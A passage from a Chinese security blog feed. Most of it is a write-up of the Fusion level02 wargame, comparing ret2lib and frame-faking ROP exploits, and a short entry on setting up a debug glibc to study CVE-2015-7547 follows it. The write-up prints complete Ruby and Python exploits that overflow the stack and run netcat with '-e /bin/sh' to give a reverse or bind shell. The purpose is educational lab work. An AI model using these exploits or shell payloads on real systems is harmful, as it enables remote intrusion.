class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">    <span class="comment"># Open the TCP connection</span></span><br><span class="line">    connect</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Receive initial messages</span></span><br><span class="line">    buffered_recv(<span class="number">57</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Recover the encryption key</span></span><br><span class="line">    data = <span class="string">"A"</span> *<span class="number">128</span></span><br><span class="line">    encrypted_data = encrypt(data.length, data)</span><br><span class="line">    key = xor_encrypt(data, encrypted_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Created enough data to cause a crash</span></span><br><span class="line">    prejunk = <span class="string">"A"</span> * <span class="number">0x20010</span> </span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">"/bin/nc.traditional"</span></span><br><span class="line">    null = <span class="string">"\000"</span></span><br><span class="line">    args = [cmd, <span class="string">"-e"</span>, <span class="string">"/bin/sh"</span>, datastore[<span class="string">'LHOST'</span>], datastore[<span class="string">'LPORT'</span>].to_s]</span><br><span class="line">    bss = <span class="number">0x0804b420</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create each of the string pointers</span></span><br><span class="line">    offset = <span class="number">24</span> + cmd.length + <span class="number">1</span> <span class="comment"># 6 ptrs, the command, and a null</span></span><br><span class="line">    args.each <span class="keyword">do</span> |arg| </span><br><span class="line">      data += [bss+offset].pack(<span class="string">'V'</span>)</span><br><span class="line">      offset += arg.length + <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="comment"># Terminate the string pointers</span></span><br><span class="line">    data += [<span class="number">0x00000000</span>].pack(<span class="string">'V'</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># The first argument, the filename</span></span><br><span class="line">    data += cmd + null</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create each of the argument strings</span></span><br><span class="line">    args.each &#123; |arg| data += arg + null &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ROP chain for nread</span></span><br><span class="line">    ropbuf = [<span class="number">0x0804952d</span>].pack(<span class="string">'V'</span>) <span class="comment"># addr of nread</span></span><br><span class="line">    ropbuf += [<span class="number">0x08048f85</span>].pack(<span class="string">'I'</span>) <span class="comment"># return address, also pop;pop;pop </span></span><br><span class="line">    ropbuf += [<span class="number">0x00000000</span>].pack(<span class="string">'I'</span>) <span class="comment"># arg0: filedes</span></span><br><span class="line">    ropbuf += [<span class="number">0x0804b420</span>].pack(<span class="string">'V'</span>) <span class="comment"># arg1: buf ptr</span></span><br><span class="line">    ropbuf += [data.length].pack(<span class="string">'I'</span>) <span class="comment"># arg2: length</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ROP chain for execve </span></span><br><span class="line">    ropbuf += [<span class="number">0x08048818</span>].pack(<span class="string">'V'</span>) <span class="comment"># pop ebx | ret</span></span><br><span class="line">    ropbuf += [<span class="number">0x0804b3d8</span>].pack(<span class="string">'V'</span>) <span class="comment"># got entry for execve</span></span><br><span class="line">    ropbuf += [<span class="number">0x08049fe3</span>].pack(<span class="string">'V'</span>) <span class="comment"># call ebx</span></span><br><span class="line">    ropbuf += [<span class="number">0x0804b438</span>].pack(<span class="string">'V'</span>) <span class="comment"># addr of /bin/nc.traiditonal</span></span><br><span class="line">    ropbuf += [<span class="number">0x0804b420</span>].pack(<span class="string">'I'</span>) <span class="comment"># addr of args</span></span><br><span class="line">    ropbuf += [<span class="number">0x00000000</span>].pack(<span class="string">'I'</span>) <span class="comment"># null</span></span><br><span class="line"></span><br><span class="line">    buf = prejunk + ropbuf</span><br><span class="line">    e = xor_encrypt(buf, key)</span><br><span class="line">    encrypt(e.length, e)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send the quit command</span></span><br><span class="line">    sock.put(<span class="string">'Q'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send extra data for the rop chain to read</span></span><br><span class="line">    sock.put(data)</span><br><span class="line"></span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h2 id="3-2_ROP_chain_for_nread">3.2 ROP chain for nread</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Created enough data to cause a crash</span></span><br><span class="line">prejunk = <span class="string">"A"</span> * <span class="number">0x20010</span> </span><br><span class="line"><span class="comment">#[...] 省略</span></span><br><span class="line"><span class="comment"># ROP chain for nread</span></span><br><span class="line">ropbuf = [<span class="number">0x0804952d</span>].pack(<span class="string">'V'</span>) <span class="comment"># addr of nread</span></span><br><span class="line">ropbuf += [<span class="number">0x08048f85</span>].pack(<span class="string">'I'</span>) <span class="comment"># return address, also pop;pop;pop </span></span><br><span class="line">ropbuf += [<span class="number">0x00000000</span>].pack(<span class="string">'I'</span>) <span class="comment"># arg0: filedes</span></span><br><span class="line">ropbuf += [<span class="number">0x0804b420</span>].pack(<span class="string">'V'</span>) <span class="comment"># arg1: buf ptr</span></span><br><span class="line">ropbuf += [data.length].pack(<span class="string">'I'</span>) <span class="comment"># arg2: length</span></span><br></pre></td></tr></table></figure>
<h3 id="3-2-1_发送payload">3.2.1 发送payload</h3><p>当payload被提交到给服务器之后，栈上内存空间如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_payload.png" alt="栈上内存分布图"></p>
<p>了解栈上的内存分布之后，就对控制EIP之后的每一步执行做详细的分析。</p>
<h3 id="3-2-2_改写EIP为nread地址">3.2.2 改写EIP为nread地址</h3><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_eip_ret.png" alt="控制EIP"></p>
<p>因为执行了<code>ret</code>指令相当于<code>pop esi</code>,所以EIP地址覆盖为nread函数的起始地址的同时，<code>ESP</code>寄存器指向了后面的<code>ROP</code>组件。<code>pop;pop;pop;ret</code>这个ROP组件也是这一次利用的<strong>精髓所做</strong>，后面会做详细分析。</p>
<p>​    </p>
<h3 id="3-2-3_执行nread函数">3.2.3 执行nread函数</h3><p>与栈上平衡相关的代码只有开始开始和结束部分的代码。所以着重分析这几句代码。原理很简单，看图就好。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_nread_1.png" alt="push ebp"></p>
<hr>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_nread_2.png" alt="mov ebp,esp"></p>
<hr>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_nread_3.png" alt="sub esp,0x28"></p>
<hr>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_nread_4.png" alt="leave"></p>
<hr>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_nread_5.png" alt="ret"></p>
<h3 id="3-2-4_清空栈上参数">3.2.4 清空栈上参数</h3><p>​    </p>
<p>这里是整个利用最核心的地方，通过ROP调用<code>pop;pop;pop;ret;</code>来<strong>清空栈上的参数</strong>，为下一次函数调用做准备。</p>
<p>​    </p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_nread_4.png" alt="ret之前"></p>
<p>这是在调用<code>ret</code>指令从<code>nread</code>函数返回之前的栈上内存分布情况，且<code>ret</code>指令执行之后，EIP寄存将被赋值为当前ESP寄存器指向的地址处的代码。也就是回去执行<code>pop;pop;pop;ret;</code>。</p>
<p>先假设这里不去做<code>pop;pop;pop;ret;</code>，而是将地址赋值为<code>execve</code>函数的地址，思考一下会发什么什么情况。</p>
<p>显然execve函数的代码会被执行，但是filedes会被认为是<code>execve</code>函数的<strong>返回地址</strong>，.bss是<strong>第一参数</strong>，length是<strong>第二参数</strong>，以此类推。显然是无法进行第二次函数调用的。因为参数无法控制。</p>
<p>但是通过ROP调用<code>pop;pop;pop;ret;</code>之后栈上的参数会被清空，为第二次函数调用execve提供了可能。</p>
<p>执行过程如下图所示。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_nread_6.png" alt="pop1"></p>
<hr>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_nread_7.png" alt="pop2"></p>
<hr>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_nread_8.png" alt="pop3"></p>
<p>在三次pop调用之后，栈上空间分布如上图所示。这时候<code>ret</code>指令执行之后，将会执行上图ESP寄存器指向的地址处的代码。而第二次调用的参数应该存放在上图的<code>dont care</code>处的数据。而该处的值是可控的，所以只需要构建第二次调用的ROPchain即可。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROP chain for nread</span></span><br><span class="line">  ropbuf = [<span class="number">0x0804952d</span>].pack(<span class="string">'V'</span>) <span class="comment"># addr of nread</span></span><br><span class="line">  ropbuf += [<span class="number">0x08048f85</span>].pack(<span class="string">'I'</span>) <span class="comment"># return address, also pop;pop;pop </span></span><br><span class="line">  ropbuf += [<span class="number">0x00000000</span>].pack(<span class="string">'I'</span>) <span class="comment"># arg0: filedes</span></span><br><span class="line">  ropbuf += [<span class="number">0x0804b420</span>].pack(<span class="string">'V'</span>) <span class="comment"># arg1: buf ptr</span></span><br><span class="line">  ropbuf += [data.length].pack(<span class="string">'I'</span>) <span class="comment"># arg2: length</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># ROP chain for execve </span></span><br><span class="line">  ropbuf += [<span class="number">0x08048818</span>].pack(<span class="string">'V'</span>) <span class="comment"># pop ebx | ret</span></span><br><span class="line">  ropbuf += [<span class="number">0x0804b3d8</span>].pack(<span class="string">'V'</span>) <span class="comment"># got entry for execve</span></span><br><span class="line">  ropbuf += [<span class="number">0x08049fe3</span>].pack(<span class="string">'V'</span>) <span class="comment"># call ebx</span></span><br><span class="line">  ropbuf += [<span class="number">0x0804b438</span>].pack(<span class="string">'V'</span>) <span class="comment"># addr of /bin/nc.traiditonal</span></span><br><span class="line">  ropbuf += [<span class="number">0x0804b420</span>].pack(<span class="string">'I'</span>) <span class="comment"># addr of args</span></span><br><span class="line">  ropbuf += [<span class="number">0x00000000</span>].pack(<span class="string">'I'</span>) <span class="comment"># null</span></span><br></pre></td></tr></table></figure>
<p>​    </p>
<p>当payload如上面的代码时，从<code>pop;pop;pop;ret;</code>之后将会执行<code>0x08048818</code>处的ROP片段。这里显然很容易理解，通过<code>pop</code>赋值<code>ebx</code>为<code>execve</code>的地址，再<code>call ebx</code>执行函数调用。</p>
<h2 id="3-3_总结">3.3 总结</h2><p>再利用ret2lib来完成伪造函数调用时，如果需要构造一连串的函数调用，可以通过如下图所示的方式来构建ROP链。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/ret2lib_stack_balance.png" alt="栈平衡"></p>
<p>如果无法找到相应的ROP组件来完成栈平衡的话，就<strong>无法第二次调用</strong>需要参数的函数。</p>
<p>但是ret2lib，在不做栈平衡的时候，连续调用<strong>没有参数的函数</strong>还是可行的。</p>
<h1 id="0x04_fake_frame详解">0x04 fake frame详解</h1><h2 id="4-1_exploit代码">4.1 exploit代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_exactly</span><span class="params">(s, n)</span>:</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(data) &lt; n:</span><br><span class="line">        data += s.recv(n - len(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">(s)</span>:</span></span><br><span class="line">    data = <span class="string">'A'</span>*<span class="number">128</span></span><br><span class="line">    recv_exactly(s, <span class="number">57</span>)</span><br><span class="line">    s.send(<span class="string">'E'</span>)</span><br><span class="line">    s.send(struct.pack(<span class="string">"&lt;I"</span>, len(data)))</span><br><span class="line">    s.send(data)</span><br><span class="line">    recv_exactly(s, <span class="number">120</span>)</span><br><span class="line">    size_packed = recv_exactly(s, <span class="number">4</span>)</span><br><span class="line">    size_unpacked = struct.unpack(<span class="string">"&lt;I"</span>, size_packed)[<span class="number">0</span>]</span><br><span class="line">    enc = recv_exactly(s, size_unpacked)</span><br><span class="line"></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(data)):</span><br><span class="line">        key.append(ord(<span class="string">'A'</span>)^ord(enc[i]))</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_socket</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_payload</span><span class="params">(payload, key)</span>:</span></span><br><span class="line">    data = []</span><br><span class="line">    keylen = len(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(payload)):</span><br><span class="line">        data.append(chr(ord(payload[i])^key[i%keylen]))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(s, key)</span>:</span></span><br><span class="line">    base = <span class="number">0x0804b420</span></span><br><span class="line">    junk = <span class="string">'A'</span>*<span class="number">0x20010</span></span><br><span class="line">    bss = struct.pack(<span class="string">"&lt;I"</span>, base)</span><br><span class="line">    nread = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x0804952d</span>)</span><br><span class="line">    fd = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>)</span><br><span class="line">    size = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">100</span>)</span><br><span class="line">    popebp = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x08048b13</span>)</span><br><span class="line">    ebp = bss</span><br><span class="line">    leaveret = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x08048b41</span>)</span><br><span class="line">    stage0 = popebp + ebp + nread + leaveret + fd + bss + size</span><br><span class="line">    payload1 = junk + stage0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Sending stage0 data..."</span></span><br><span class="line">    payload1_enc = encrypt_payload(payload1, key)</span><br><span class="line">    s.send(<span class="string">"E"</span>)</span><br><span class="line">    s.send(struct.pack(<span class="string">"&lt;I"</span>, len(payload1_enc)))</span><br><span class="line">    s.send(payload1_enc)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    s.recv(<span class="number">0xFFFFFF</span>)</span><br><span class="line">    s.send(<span class="string">"Q"</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    null = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x00</span>)</span><br><span class="line">    filler = <span class="string">"DDDD"</span></span><br><span class="line">    execve = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x080489b0</span>)</span><br><span class="line">    exit = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x08048960</span>)</span><br><span class="line">    args = struct.pack(<span class="string">"&lt;I"</span>, base + <span class="number">24</span>)</span><br><span class="line">    envp = null</span><br><span class="line"></span><br><span class="line">    data_offset = <span class="number">40</span></span><br><span class="line">    binnc = struct.pack(<span class="string">"&lt;I"</span>, base + data_offset)</span><br><span class="line">    ncarg1 = struct.pack(<span class="string">"&lt;I"</span>, base + data_offset + <span class="number">20</span>)</span><br><span class="line">    ncarg2 = struct.pack(<span class="string">"&lt;I"</span>, base + data_offset + <span class="number">29</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Sending stage1 data..."</span></span><br><span class="line">    stage1 = filler + execve + exit + binnc + args + envp</span><br><span class="line">    stage1 += binnc + ncarg1 + ncarg2 + null</span><br><span class="line">    stage1 += <span class="string">"/bin/nc.traditional\0"</span> + <span class="string">"-ltp6667\0"</span> + <span class="string">"-e/bin/sh\0"</span></span><br><span class="line">    junk = <span class="string">"E"</span>*(<span class="number">100</span> - len(stage1))</span><br><span class="line">    s.send(stage1+junk)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        s = get_socket(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">        key = get_key(s)</span><br><span class="line">        pwn(s, key)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"pwn done..."</span></span><br></pre></td></tr></table></figure>
<p>同样的分了两步来进行利用。首先看第一块payload。</p>
<h2 id="4-2_构建frame_fake的内存分布">4.2 构建frame fake的内存分布</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="number">0x0804b420</span></span><br><span class="line">  junk = <span class="string">'A'</span>*<span class="number">0x20010</span></span><br><span class="line">  bss = struct.pack(<span class="string">"&lt;I"</span>, base)</span><br><span class="line">  nread = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x0804952d</span>)</span><br><span class="line">  fd = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0</span>)</span><br><span class="line">  size = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">100</span>)</span><br><span class="line">  popebp = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x08048b13</span>)</span><br><span class="line">  ebp = bss</span><br><span class="line">  leaveret = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x08048b41</span>)</span><br><span class="line">  stage0 = popebp + ebp + nread + leaveret + fd + bss + size</span><br><span class="line">  payload1 = junk + stage0</span><br></pre></td></tr></table></figure>
<p>可以看到他的payload在发送给服务器之后，栈上的内存分布应该是这样的。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fusion_level02/fake_frame_payload.png" alt="栈平衡"></p>
<p>具体执行流程就不再画了，在<a href="http://BLOGIMAGE/2016/01/27/frame-faking/" target="_blank" rel="external">我之前的文章</a>有对frame的 faking详细图解。</p>
<p>这个解答就比ret2lib优雅很多，简单叙述一下原理，详见<a href="http://BLOGIMAGE/2016/01/27/frame-faking/" target="_blank" rel="external">这里</a>。</p>
<ol>
<li>通过ROP组件将EBP寄存器赋值为一个伪造的栈低。<code>EBP+4</code>处的地址指向了这一次函数调用完成后，<strong>下一次会调用的函数</strong>。这里是bss地址，所以下一个要调用的函数地址要存放于<code>&amp;bss+4</code>处。</li>
<li>通过ROP组件实现<strong>连续两次leave-ret</strong>来完成EIP控制。调用存放于<code>&amp;bss+4</code>处的函数。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">filler = <span class="string">"DDDD"</span></span><br><span class="line">execve = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x080489b0</span>)</span><br><span class="line">exit = struct.pack(<span class="string">"&lt;I"</span>, <span class="number">0x08048960</span>)</span><br><span class="line">args = struct.pack(<span class="string">"&lt;I"</span>, base + <span class="number">24</span>)</span><br><span class="line">envp = null</span><br><span class="line"></span><br><span class="line">data_offset = <span class="number">40</span></span><br><span class="line">binnc = struct.pack(<span class="string">"&lt;I"</span>, base + data_offset)</span><br><span class="line">ncarg1 = struct.pack(<span class="string">"&lt;I"</span>, base + data_offset + <span class="number">20</span>)</span><br><span class="line">ncarg2 = struct.pack(<span class="string">"&lt;I"</span>, base + data_offset + <span class="number">29</span>)</span><br><span class="line"></span><br><span class="line">stage1 = filler + execve + exit + binnc + args + envp</span><br><span class="line">stage1 += binnc + ncarg1 + ncarg2 + null</span><br><span class="line">stage1 += <span class="string">"/bin/nc.traditional\0"</span> + <span class="string">"-ltp6667\0"</span> + <span class="string">"-e/bin/sh\0"</span></span><br></pre></td></tr></table></figure>
<p>可以看到这里的<code>filler</code>，就是填充了四个字节，使得第二次调用，可以成功调用到<code>execve</code>函数。</p>
<h1 id="0x05_总结">0x05 总结</h1><p>通过两种答案的分析与对比，从逻辑层面以及exploit代码简洁清楚的层面上，frame-faking比ret2lib要好上很多。</p>
<p>通过对两种方法的追踪与重现，也可以很好地加强对栈上布局的理解。</p>
<h1 id="0x06_其他">0x06 其他</h1><p>我的技术博客地址: <a href="http://BLOGIMAGE/。" target="_blank" rel="external">http://BLOGIMAGE/。</a></p>
<p>我的推特账号:<a href="https://twitter.com/samulehuang" target="_blank" rel="external">https://twitter.com/samulehuang</a></p>
<p>一般每天都会在<a href="https://t.co/d5Ij1NDOoU" target="_blank" rel="external">liveingcode直播学习的过程 </a>，大家方便的话可以来帮我攒点人气：）。</p>
<p>欢迎大家前来指教。</p>
<h1 id="0x07_感谢&amp;索引">0x07 感谢&amp;索引</h1><p>感谢分享：）</p>
<p>1.Exploit Exercises - Fusion level02 write up</p>
<p><a href="https://philwantsfish.github.io/fusion-level02-walkthrough/" target="_blank" rel="external">https://philwantsfish.github.io/fusion-level02-walkthrough/</a></p>
<p>2.Exploit-Exercises Fusion Level02</p>
<p><a href="http://www.programlife.net/fusion-level-02.html" target="_blank" rel="external">http://www.programlife.net/fusion-level-02.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><p>​       通过一道<a href="https://exploit-exercises.com/fusion/level02/">exploit-exercises</a>中的题目的解答来体会frame faking在实际的利用中的使用技巧。通过实践了网上的两个writeup并进行分析，加深理解做了简单的总结。</p>]]>
    
    </summary>
    
      <category term="exploit" scheme="http://yoursite.com/tags/exploit/"/>
    
      <category term="frame-faking" scheme="http://yoursite.com/tags/frame-faking/"/>
    
      <category term="level02" scheme="http://yoursite.com/tags/level02/"/>
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="wargame" scheme="http://yoursite.com/tags/wargame/"/>
    
      <category term="fusion" scheme="http://yoursite.com/categories/fusion/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[对CVE-2015-7547简单的分析与调试]]></title>
    <link href="http://yoursite.com/2016/02/19/CVE-2015-7547%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
    <id>http://yoursite.com/2016/02/19/CVE-2015-7547分析与调试/</id>
    <published>2016-02-19T18:21:22.000Z</published>
    <updated>2016-03-24T03:35:30.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_漏洞信息">0x00 漏洞信息</h1><p>​    最近glibc有一个栈溢出的漏洞具体情况，漏洞的具体信息可以参考下面两个链接。</p>
<p>​    <a href="http://www.freebuf.com/news/96244.html" target="_blank" rel="external">Linux glibc再曝漏洞：可导致Linux软件劫持</a></p>
<p>​    <a href="https://googleonlinesecurity.blogspot.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html" target="_blank" rel="external">CVE-2015-7547: glibc getaddrinfo stack-based buffer overflow</a></p>
<p>​    poc在上面的链接中可以下载。</p>
<a id="more"></a>
<h1 id="0x01_环境准备">0x01 环境准备</h1><p>​    操作系统：ubuntu15.04</p>
<p>​    glibc版本：glibc-2.2.0</p>
<p>​    </p>
<h2 id="1-1_glibc源码编译">1.1 glibc源码编译</h2><p>​    在ubuntu系统下，只需要执行源码和调试符的命令之后就可以使用gdb对glibc的跟踪调试，安装指令如下：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">sudo</span> apt-<span class="preprocessor">get</span> install libc6-<span class="keyword">dbg</span><br><span class="line"></span><span class="label">sudo</span> apt-<span class="preprocessor">get</span> source libc6-dev</span><br></pre></td></tr></table></figure>
<p>​    但是因为系统自带的glibc是<strong>发行版</strong>的，所以在编译的是时候选用了优化参数 <code>-O2</code>,所以在调试的过程中会出现<strong>变量被优化无法读取</strong>以及代码运行的时候与<strong>源码的行数</strong>对不上的情况。</p>
<p>​    <strong>所以需要自己编译一个可调式并且没有过度优化的glibc来进行调试。</strong></p>
<p>​    首先，从glibc的官网下载glibc的源码。我选择了2.20的版本。编译安装glibc的方法很容易可以在网上找到。需要注意的是在进行configure时需要设置一些特殊的参数。如果需要调试宏可以添加 -gdwarf-2,glibc无法使用-O0编译，不过-O1也够用了。</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>glibc220<span class="regexp">/configure --prefix=/</span>usr<span class="regexp">/local/</span>glibc220/ --enable-debug CFLAGS=<span class="string">"-g -O1"</span> CPPFLAGS = <span class="string">"-g -O1"</span></span><br></pre></td></tr></table></figure>
<p>​    在<code>configure</code>执行完成之后只需要简单执行编译与安装就好了。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">make</span></span><br><span class="line">sudo <span class="built_in">make</span> install</span><br></pre></td></tr></table></figure>
<h2 id="1-2_使用调试版本glibc编译POC">1.2 使用调试版本glibc编译POC</h2><p>​    在glibc编译安装成功后，系统默认的glibc还是原来的那个。所以需要选择指定的glibc来编译POC代码。</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="keyword">client</span> CVE-<span class="number">2015</span>-<span class="number">7547</span>-<span class="keyword">client</span>.c -Wl,-rpath /usr/local/glibc220</span><br></pre></td></tr></table></figure>
